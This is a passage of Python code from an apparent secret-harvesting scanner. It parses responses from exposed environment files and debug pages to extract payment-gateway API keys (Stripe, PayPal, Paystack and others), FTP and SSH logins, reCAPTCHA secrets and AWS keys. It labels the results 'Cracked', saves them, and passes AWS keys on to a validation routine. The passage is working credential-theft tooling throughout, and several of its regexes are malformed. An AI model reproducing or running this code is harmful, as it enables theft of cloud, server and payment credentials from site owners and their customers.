			secret = get_param(resp, "<td>PAYTM_MERCHANT_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found PayTm => {check_format}', style='green')
				xSave("Cracked", "PAYTM-API", check_format)

	elif "PAYHERE_MERCHANT_ID" in resp:
		if "PAYHERE_MERCHANT_ID=" in resp:
			authkey = get_param(resp, "\nPAYHERE_MERCHANT_ID=(.*?)\n")
			secret = get_param(resp, "\nPAYHERE_SECRET={.*?)\n")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found PAYHERE => {check_format}', style='green')
				xSave("Cracked", "PAYHERE-API", check_format)

		elif "<td>PAYHERE_MERCHANT_ID</td>" in resp:
			authkey = get_param(resp, "<td>PAYHERE_MERCHANT_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>PAYHERE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found PAYHERE => {check_format}', style='green')
				xSave("Cracked", "PAYHERE-API", check_format)

	elif "NGENIUS_OUTLET_ID" in resp:
		if "NGENIUS_OUTLET_ID=" in resp:
			authkey = get_param(resp, "\nNGENIUS_OUTLET_ID=(.*?)\n")
			secret = get_param(resp, "\nNGENIUS_API_KEY={.*?)\n")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found NGENIUS => {check_format}', style='green')
				xSave("Cracked", "NGENIUS-API", check_format)

		elif "<td>NGENIUS_OUTLET_ID</td>" in resp:
			authkey = get_param(resp, "<td>NGENIUS_OUTLET_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>NGENIUS_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found NGENIUS => {check_format}', style='green')
				xSave("Cracked", "NGENIUS-API", check_format)

	elif "IYZICO_API_KEY" in resp:
		if "IYZICO_API_KEY=" in resp:
			authkey = get_param(resp, "\nIYZICO_API_KEY=(.*?)\n")
			secret = get_param(resp, "\nIYZICO_SECRET_KEY={.*?)\n")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found IYZICO => {check_format}', style='green')
				xSave("Cracked", "IYZICO-API", check_format)

		elif "<td>IYZICO_API_KEY</td>" in resp:
			authkey = get_param(resp, "<td>IYZICO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>IYZICO_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found IYZICO => {check_format}', style='green')
				xSave("Cracked", "IYZICO-API", check_format)

	elif "PAYPAL_CLIENT_ID" in resp:
		if "PAYPAL_CLIENT_ID=" in resp:
			authkey = get_param(resp, "\nPAYPAL_CLIENT_ID=(.*?)\n")
			secret = get_param(resp, "\nPAYPAL_CLIENT_SECRET={.*?)\n")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found PayPal => {check_format}', style='green')
				xSave("Cracked", "PaypalSandbox-API", check_format)

		elif "<td>PAYPAL_CLIENT_ID</td>" in resp:
			authkey = get_param(resp, "<td>PAYPAL_CLIENT_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>PAYPAL_CLIENT_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found PayPal => {check_format}', style='green')
				xSave("Cracked", "PaypalSandbox-API", check_format)

	elif "STRIPE_KEY_CHINA_FINANCE" in resp:
		if "STRIPE_KEY_CHINA_FINANCE=" in resp:
			authkey = get_param(resp, "\nSTRIPE_KEY_CHINA_FINANCE=(.*?)\n")
			secret = get_param(resp, "\nSTRIPE_SECRET_CHINA_FINANCE={.*?)\n")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found Stripe => {check_format}', style='green')
				xSave("Cracked", "STRIPE-API", check_format)

		elif "<td>STRIPE_KEY_CHINA_FINANCE</td>" in resp:
			authkey = get_param(resp, "<td>STRIPE_KEY_CHINA_FINANCE<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>STRIPE_SECRET_CHINA_FINANCE<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found Stripe => {check_format}', style='green')
				xSave("Cracked", "STRIPE-API", check_format)

	elif "STRIPE_KEY_CINEMACITY" in resp:
		if "STRIPE_KEY_CINEMACITY=" in resp:
			authkey = get_param(resp, "\nSTRIPE_KEY_CINEMACITY=(.*?)\n")
			secret = get_param(resp, "\nSTRIPE_SECRET_CINEMACITY={.*?)\n")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found Stripe => {check_format}', style='green')
				xSave("Cracked", "STRIPE-API", check_format)

		elif "<td>STRIPE_KEY_CINEMACITY</td>" in resp:
			authkey = get_param(resp, "<td>STRIPE_KEY_CINEMACITY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>STRIPE_SECRET_CINEMACITY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found Stripe => {check_format}', style='green')
				xSave("Cracked", "STRIPE-API", check_format)

	elif "TAP_PUBLIC_KEY" in resp:
		if "TAP_PUBLIC_KEY=" in resp:
			authkey = get_param(resp, "\nTAP_PUBLIC_KEY=(.*?)\n")
			secret = get_param(resp, "\nTAP_SECRET_KEYY={.*?)\n")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found TAP => {check_format}', style='green')
				xSave("Cracked", "Tap-API", check_format)

		elif "<td>TAP_PUBLIC_KEY</td>" in resp:
			authkey = get_param(resp, "<td>TAP_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>TAP_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found TAP => {check_format}', style='green')
				xSave("Cracked", "Tap-API", check_format)

	elif "STRIPE_LIVE_KEY" in resp:
		if "STRIPE_LIVE_KEY=" in resp:
			authkey = get_param(resp, "\nSTRIPE_LIVE_KEY=(.*?)\n")
			secret = get_param(resp, "\nSTRIPE_LIVE_SECRET={.*?)\n")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found Stripe => {check_format}', style='green')
				xSave("Cracked", "STRIPE-API", check_format)

		elif "<td>STRIPE_LIVE_KEY</td>" in resp:
			authkey = get_param(resp, "<td>STRIPE_LIVE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>STRIPE_LIVE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found Stripe => {check_format}', style='green')
				xSave("Cracked", "STRIPE-API", check_format)

	elif "STRIPE_KEY_LIVE" in resp:
		if "STRIPE_KEY_LIVE=" in resp:
			authkey = get_param(resp, "\nSTRIPE_KEY_LIVE=(.*?)\n")
			secret = get_param(resp, "\nSTRIPE_SECRET_LIVE={.*?)\n")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found Stripe => {check_format}', style='green')
				xSave("Cracked", "STRIPE-API", check_format)

		elif "<td>STRIPE_KEY_LIVE</td>" in resp:
			authkey = get_param(resp, "<td>STRIPE_KEY_LIVE<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>STRIPE_SECRET_LIVE<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found Stripe => {check_format}', style='green')
				xSave("Cracked", "STRIPE-API", check_format)

	elif "PAYSTACK_PUBLIC_KEY" in resp:
		if "PAYSTACK_PUBLIC_KEY=" in resp:
			authkey = get_param(resp, "\nPAYSTACK_PUBLIC_KEY=(.*?)\n")
			secret = get_param(resp, "\nPAYSTACK_SECRET_KEY={.*?)\n")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found PayStack => {check_format}', style='green')
				xSave("Cracked", "PayStack-API", check_format)

		elif "<td>PAYSTACK_PUBLIC_KEY</td>" in resp:
			authkey = get_param(resp, "<td>PAYSTACK_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			secret = get_param(resp, "<td>PAYSTACK_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if authkey != '-' and secret != '-':
				check_format = f"{authkey}|{secret}"
				console.print(f'[+] Found PayStack => {check_format}', style='green')
				xSave("Cracked", "PayStack-API", check_format)

	elif "FTP_HOST" in resp:
		if "FTP_HOST=" in resp:
			host = get_param(resp, "\nFTP_HOST=(.*?)\n")
			user = get_param(resp, "\nFTP_USERNAME={.*?)\n")
			password = get_param(resp, "\nFTP_PASSWORD={.*?)\n")
			if user != '-' and password != '-':
				check_format = f"{host}|{user}|{password}"
				console.print(f'[+] Found FTP => {check_format}', style='green')
				xSave("Cracked", "FTP_DETAILS", check_format)

		elif "<td>FTP_HOST</td>" in resp:
			host = get_param(resp, "<td>FTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>")
			user = get_param(resp, "<td>FTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>")
			password = get_param(resp, "<td>FTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if user != '-' and password != '-':
				check_format = f"{host}|{user}|{password}"
				console.print(f'[+] Found FTP => {check_format}', style='green')
				xSave("Cracked", "FTP_DETAILS", check_format)

	elif "SSH_USERNAME" in resp:
		if "SSH_USERNAME=" in resp:
			host = get_param(resp, "\nSSH_IP=(.*?)\n")
			user = get_param(resp, "\nSSH_USERNAME={.*?)\n")
			password = get_param(resp, "\nSSH_PASSWORD={.*?)\n")
			if user != '-' and password != '-':
				check_format = f"{host}|{user}|{password}"
				console.print(f'[+] Found ssh => {check_format}', style='green')
				xSave("Cracked", "SSH_DETAILS", check_format)

		elif "<td>SSH_USERNAME</td>" in resp:
			host = get_param(resp, "<td>SSH_IP<\/td>\s+<td><pre.*>(.*?)<\/span>")
			user = get_param(resp, "<td>SSH_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>")
			password = get_param(resp, "<td>SSH_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if user != '-' and password != '-':
				check_format = f"{host}|{user}|{password}"
				console.print(f'[+] Found ssh => {check_format}', style='green')
				xSave("Cracked", "SSH_DETAILS", check_format)

	elif "RECAPTCHA_SITE_KEY" in resp:
		if "RECAPTCHA_SITE_KEY=" in resp:
			RECAPTCHA_SITE_KEY = get_param(resp, "\nRECAPTCHA_SITE_KEY=(.*?)\n")
			RECAPTCHA_SECRET_KEY = get_param(resp, "\nRECAPTCHA_SECRET_KEY={.*?)\n")
			if RECAPTCHA_SITE_KEY != '-' and RECAPTCHA_SECRET_KEY != '-':
				check_format = f"{RECAPTCHA_SITE_KEY}|{RECAPTCHA_SECRET_KEY}"
				console.print(f'[+] Found RECAPTCHA TOKENS => {check_format}', style='green')
				xSave("Cracked", "RECAPTCHA_API", check_format)

		elif "<td>RECAPTCHA_SITE_KEY</td>" in resp:
			RECAPTCHA_SITE_KEY = get_param(resp, "<td>RECAPTCHA_SITE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			RECAPTCHA_SECRET_KEY = get_param(resp, "<td>RECAPTCHA_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")

			if RECAPTCHA_SITE_KEY != '-' and RECAPTCHA_SECRET_KEY != '-':
				check_format = f"{RECAPTCHA_SITE_KEY}|{RECAPTCHA_SECRET_KEY}"
				console.print(f'[+] Found RECAPTCHA TOKENS => {check_format}', style='green')
				xSave("Cracked", "RECAPTCHA_API", check_format)

	elif "GOOGLE_RECAPTCHA_KEY" in resp:
		if "GOOGLE_RECAPTCHA_KEY=" in resp:
			GOOGLE_RECAPTCHA_KEY = get_param(resp, "\nGOOGLE_RECAPTCHA_KEY=(.*?)\n")
			GOOGLE_RECAPTCHA_SECRET = get_param(resp, "\nGOOGLE_RECAPTCHA_SECRET={.*?)\n")
			if GOOGLE_RECAPTCHA_KEY != '-' and GOOGLE_RECAPTCHA_SECRET != '-':
				check_format = f"{GOOGLE_RECAPTCHA_KEY}|{GOOGLE_RECAPTCHA_SECRET}"
				console.print(f'[+] Found RECAPTCHA TOKENS => {check_format}', style='green')
				xSave("Cracked", "RECAPTCHA_API", check_format)

		elif "<td>GOOGLE_RECAPTCHA_KEY</td>" in resp:
			GOOGLE_RECAPTCHA_KEY = get_param(resp, "<td>GOOGLE_RECAPTCHA_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			GOOGLE_RECAPTCHA_SECRET = get_param(resp, "<td>GOOGLE_RECAPTCHA_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")

			if GOOGLE_RECAPTCHA_KEY != '-' and GOOGLE_RECAPTCHA_SECRET != '-':
				check_format = f"{GOOGLE_RECAPTCHA_KEY}|{GOOGLE_RECAPTCHA_SECRET}"
				console.print(f'[+] Found RECAPTCHA TOKENS => {check_format}', style='green')
				xSave("Cracked", "RECAPTCHA_API", check_format)

	elif "CAPTCHA_KEY" in resp:
		if "CAPTCHA_KEY=" in resp:
			CAPTCHA_KEY = get_param(resp, "\nCAPTCHA_KEY=(.*?)\n")
			if CAPTCHA_KEY != '-':
				check_format = f"{CAPTCHA_KEY}"
				console.print(f'[+] Found CAPTCHA_KEY => {check_format}', style='green')
				xSave("Cracked", "RECAPTCHA_API", check_format)

		elif "<td>CAPTCHA_KEY</td>" in resp:
			CAPTCHA_KEY = get_param(resp, "<td>CAPTCHA_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			if CAPTCHA_KEY != '-':
				check_format = f"{CAPTCHA_KEY}"
				console.print(f'[+] Found CAPTCHA_KEY => {check_format}', style='green')
				xSave("Cracked", "RECAPTCHA_API", check_format)

def get_aws_region(resp):
	for region in list_region.splitlines():
		if str(region) in resp:
			return region
			break

def get_aws_data(resp, url):
	if "AWS_ACCESS_KEY_ID" in resp:
		if "AWS_ACCESS_KEY_ID=" in resp:
			aws_key = get_param(resp, "\nAWS_ACCESS_KEY_ID=(.*?)\n")
			aws_secret = get_param(resp, "\nAWS_SECRET_ACCESS_KEY=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			
		elif "<td>AWS_ACCESS_KEY_ID</td>" in resp:
			aws_key = get_param(resp, "<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			
	
	elif "AWS_KEY" in resp:
		if "AWS_KEY" in resp:
			aws_key = get_param(resp, "\nAWS_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nAWS_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			aws_budget = get_param(resp, "\nAWS_BUCKET=(.*?)\n")
			check_format = f"{aws_key}|{aws_secret}|{aws_region}|{aws_budget}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

		elif "<td>AWS_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			aws_budget = get_param(resp, "<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			check_format = f"{aws_key}|{aws_secret}|{aws_region}|{aws_budget}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "AWS_ID" in resp:
		if "AWS_ID" in resp:
			aws_key = get_param(resp, "\nAWS_ID=(.*?)\n")
			aws_secret = get_param(resp, "\nAWS_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

		elif "<td>AWS_ID</td>" in resp:
			aws_key = get_param(resp, "<td>AWS_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
	
	elif "AWS_SNS_KEY" in resp:
		if "AWS_SNS_KEY" in resp:
			aws_sns_key = get_param(resp, "\nAWS_SNS_KEY=(.*?)\n")
			aws_sns_secret = get_param(resp, "\nAWS_SNS_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			aws_sns_from = get_param(resp, "\nSMS_FROM=(.*?)\n")
			aws_sns_driver = get_param(resp, "\nSMS_DRIVER=(.*?)\n")
			check_format = f"{aws_sns_key}|{aws_sns_secret}|{aws_region}|{aws_sns_from}|{aws_sns_driver}"
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_sns_key, aws_sns_secret, aws_region, url)

	elif "AWS_S3_KEY" in resp:
		if "AWS_S3_KEY" in resp:
			aws_key = get_param(resp, "\nAWS_S3_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nAWS_S3_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

		elif "<td>AWS_S3_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

	elif "SES_KEY" in resp:
		if "SES_KEY" in resp:
			aws_key = get_param(resp, "\nSES_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nSES_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>SES_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "AWS_ACCESS_KEY_ID" in resp:
		if "AWS_ACCESS_KEY_ID=" in resp:
			aws_key = get_param(resp, "\nAWS_ACCESS_KEY_ID=(.*?)\n")
			aws_secret = get_param(resp, "\nAWS_SECRET_ACCESS_KEY=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

		elif "<td>AWS_ACCESS_KEY_ID</td>" in resp:
			aws_key = get_param(resp, "<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "AWS_ACCESS_KEY_ID_2" in resp:
		if "AWS_ACCESS_KEY_ID_2" in resp:
			aws_key = get_param(resp, "\nAWS_ACCESS_KEY_ID_2=(.*?)\n")
			aws_secret = get_param(resp, "\nAWS_SECRET_ACCESS_KEY_2=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

		elif "<td>AWS_ACCESS_KEY_ID_2</td>" in resp:
			aws_key = get_param(resp, "<td>AWS_ACCESS_KEY_ID_2<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>AWS_SECRET_ACCESS_KEY_2<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

	elif "FILESYSTEMS_DISKS_S3_KEY" in resp:
		if "FILESYSTEMS_DISKS_S3_KEY=" in resp:
			aws_key = get_param(resp, "\nFILESYSTEMS_DISKS_S3_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nFILESYSTEMS_DISKS_S3_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

		elif "<td>FILESYSTEMS_DISKS_S3_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>FILESYSTEMS_DISKS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>FILESYSTEMS_DISKS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
			

	elif "DYNAMODB_KEY" in resp:
		if "DYNAMODB_KEY=" in resp:
			aws_key = get_param(resp, "\nDYNAMODB_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nDYNAMODB_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
		
		elif "<td>DYNAMODB_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>DYNAMODB_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>DYNAMODB_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "STORAGE_KEY" in resp:
		if "STORAGE_KEY=" in resp:
			aws_key = get_param(resp, "\nSTORAGE_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nSTORAGE_SECRET=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)
		
		elif "<td>STORAGE_KEY</td>" in resp:
			aws_key = get_param(resp, "<td>STORAGE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_secret = get_param(resp, "<td>STORAGE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

	elif "AMAZON_API_KEY" in resp:
		if "AMAZON_API_KEY=" in resp:
			aws_key = get_param(resp, "\nAMAZON_API_KEY=(.*?)\n")
			aws_secret = get_param(resp, "\nAMAZON_API_SECRET_KEY=(.*?)\n")
			aws_region = get_aws_region(resp)
			check_format = f"{aws_key}|{aws_secret}|{aws_region}"
			Normal_format = f"+++++++++++++++\nURL={url}\nAWS_KEY={aws_key}\nAWS_SECRET={aws_secret}\nAWS_REGION={aws_region}\n+++++++++++++++"			
			x = is_valid_info(check_format)
			if x:
				console.print(f"[+] AWS KEYS Found ==> {url} | DATA : {check_format}", style="green")
				Check_aws(aws_key, aws_secret, aws_region, url)

